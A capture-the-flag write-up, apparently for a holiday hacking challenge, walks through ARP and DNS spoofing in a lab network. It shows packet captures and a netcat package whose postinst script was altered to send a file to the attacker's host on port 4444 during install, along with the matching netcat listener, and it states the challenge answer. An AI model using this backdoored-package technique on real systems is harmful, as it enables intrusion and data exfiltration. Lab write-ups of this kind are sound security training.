# Objective 9: ARP Shenanigans

To be completed


Capture of ARP spoofing success with following DNS query:

    15:57:47.028750 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
    15:57:47.057274 IP 10.6.6.35.27609 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)`

Capture of ARP and DNS spoofing with following HTTP request:

    17:27:16.968588 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
    17:27:16.992764 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
    17:27:17.009009 IP 10.6.6.35.16498 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
    17:27:17.029673 IP 10.6.6.53.53 > 10.6.6.35.16498: 0*- 1/0/0 A 10.6.0.2 (62)
    17:27:18.098422 IP 10.6.6.35.50340 > 10.6.0.2.80: Flags [S], seq 2451495177, win 64240, options [mss 1460,sackOK,TS val 2516141758 ecr 0,nop,wscale 7], length 0
    17:27:18.098452 IP 10.6.0.2.80 > 10.6.6.35.50340: Flags [R.], seq 0, ack 2451495178, win 0, length 0

A Node.js HTTP server was started and it logged the request:

    10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -

On the device the Debian package netcat-traditional_1.10-41.1ubuntu1_amd64.deb was found.
This package was modified to include this line in the postinst script:

    /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt

and then made available in the web tree folder as pub/jfrost/backdoor/suriv_amd64.deb.
That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the attacking host, which has to run the command

    nc -lvp 4444 > text
to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt).
In this file can be found that **Tanta Kringle** recused herself from the vote.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTExMjc0NzU0MjQsLTg3ODM5MjIxNiw1MT
QyMDkxNTldfQ==
-->